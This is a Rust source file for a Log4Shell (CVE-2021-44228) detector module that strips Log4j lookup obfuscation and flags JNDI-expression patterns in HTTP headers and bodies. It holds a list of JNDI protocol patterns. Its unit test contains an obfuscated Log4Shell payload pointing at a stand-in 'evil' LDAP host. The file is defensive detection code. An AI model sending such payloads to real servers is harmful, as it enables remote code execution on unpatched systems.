//! Log4Shell / CVE-2021-44228 detector.
//!
//! MSF original:  exploit/multi/http/log4shell_header_injection
//! KSpike mirror: detector.http.log4shell_jndi
//!
//! The tell is a `${jndi:<proto>://…}` substring in any HTTP header or body,
//! where proto ∈ {ldap, ldaps, rmi, dns, iiop, http, nis, nds, corba}.
//! Attackers often obfuscate using `${lower:j}${lower:n}${lower:d}${lower:i}`
//! — we strip those before matching.

use kspike_core::prelude::*;
use kspike_kernel::inspect::bytes_contain;

pub struct Log4ShellJndiDetector { meta: ModuleMeta }

impl Default for Log4ShellJndiDetector {
    fn default() -> Self {
        Self {
            meta: ModuleMeta {
                name: "detector.http.log4shell_jndi".into(),
                kind: ModuleKind::Detector,
                version: "0.1.0".into(),
                description: "Flags JNDI-expression payloads in HTTP traffic (CVE-2021-44228).".into(),
                author: "gratech".into(),
                risk_level: 0,
                limits: KnownLimits::new()
                    .add(Limitation {
                        id: "post-deobfuscation-only".into(),
                        description: "Only strips 2 levels of ${lower:} / ${upper:} / ${env:} nesting.".into(),
                        confidence_penalty: 0.10,
                        mitigation: Some("recurse deobfuscation to full 10 levels in v0.2".into()),
                    }),
                tags: vec!["http".into(), "jndi".into(), "cve-2021-44228".into()],
            },
        }
    }
}

impl Module for Log4ShellJndiDetector {
    fn meta(&self) -> &ModuleMeta { &self.meta }
    fn evaluate(&self, s: &Signal) -> Result<ModuleVerdict> {
        if !s.kind.starts_with("net.http") { return Ok(ModuleVerdict::Ignore); }
        let Some(text) = s.data.get("text").and_then(|v| v.as_str()) else {
            return Ok(ModuleVerdict::Ignore);
        };
        let stripped = strip_lattice_obfuscation(text);
        let matched = ["${jndi:ldap:", "${jndi:ldaps:", "${jndi:rmi:",
                       "${jndi:dns:", "${jndi:iiop:", "${jndi:http:",
                       "${jndi:nis:", "${jndi:nds:", "${jndi:corba:"]
            .iter()
            .find(|pat| bytes_contain(stripped.as_bytes(), pat.as_bytes()).is_some())
            .copied();

        if let Some(pat) = matched {
            Ok(ModuleVerdict::Report {
                note: format!("Log4Shell JNDI pattern '{pat}' in HTTP from {:?}", s.actor),
                confidence: self.meta.limits.humble(0.95),
            })
        } else { Ok(ModuleVerdict::Ignore) }
    }
    fn apply(&self, v: &ModuleVerdict, _: Option<&str>) -> Result<serde_json::Value> {
        Ok(serde_json::json!({ "module": self.meta.name, "applied": v }))
    }
}

fn strip_lattice_obfuscation(input: &str) -> String {
    let mut s = input.to_string();
    for _ in 0..3 {
        for prefix in ["${lower:", "${upper:", "${env:", "${::-"] {
            while let Some(i) = s.find(prefix) {
                if let Some(end) = s[i..].find('}') {
                    let inner_start = i + prefix.len();
                    let inner_end   = i + end;
                    if inner_start <= inner_end && inner_end <= s.len() {
                        let inner = s[inner_start..inner_end].to_string();
                        s.replace_range(i..=i+end, &inner);
                        continue;
                    }
                }
                break;
            }
        }
    }
    s
}

#[cfg(test)]
mod tests {
    use super::*;
    #[test] fn obfuscation_stripped() {
        let inp = "${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://evil/x}";
        let out = strip_lattice_obfuscation(inp);
        assert!(out.contains("${jndi:ldap:"));
    }
}
